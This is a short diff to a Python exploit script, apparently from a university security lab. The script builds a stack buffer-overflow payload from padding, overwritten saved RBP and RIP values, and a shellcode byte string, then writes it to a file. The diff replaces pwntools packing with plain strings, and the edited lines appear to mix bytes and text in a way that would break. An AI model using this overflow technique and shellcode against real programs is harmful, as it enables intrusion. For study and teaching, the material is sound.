@@ -3,7 +3,7 @@
 # Nils, SUTD, 2016
 # Z. TANG, SUTD, 2019
 
-from pwn import *
+# from pwn import *
 
 lenfill = 72 # or some other value
 
@@ -12,13 +12,16 @@ payload = b'\xeb\x2a\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\xb8\x01\x00
 
 # Set up return address. pwnlib is used to turn int to string
 
-storedRBP = p64(0x4444444444444444) # DDDDDDDD in hex
+storedRBP = "DDDDDDDD"
+# p64(0x4444444444444444) # DDDDDDDD in hex
 
 # When running inside GDB
-storedRIPgdb = p64(0x4545454545454545) # EEEEEEEE in hex
+storedRIPgdb = 'EEEEEEEE'
+# p64(0x4545454545454545) # EEEEEEEE in hex
 
 # When directly running on shell
-storedRIP = p64(0x4545454545454545) # EEEEEEEE in hex
+storedRIP = 'EEEEEEEE'
+# p64(0x4545454545454545) # EEEEEEEE in hex
 
 with open('payloadgdb','wb') as f:
     f.write(b'A' * lenfill + storedRBP + storedRIPgdb + payload)
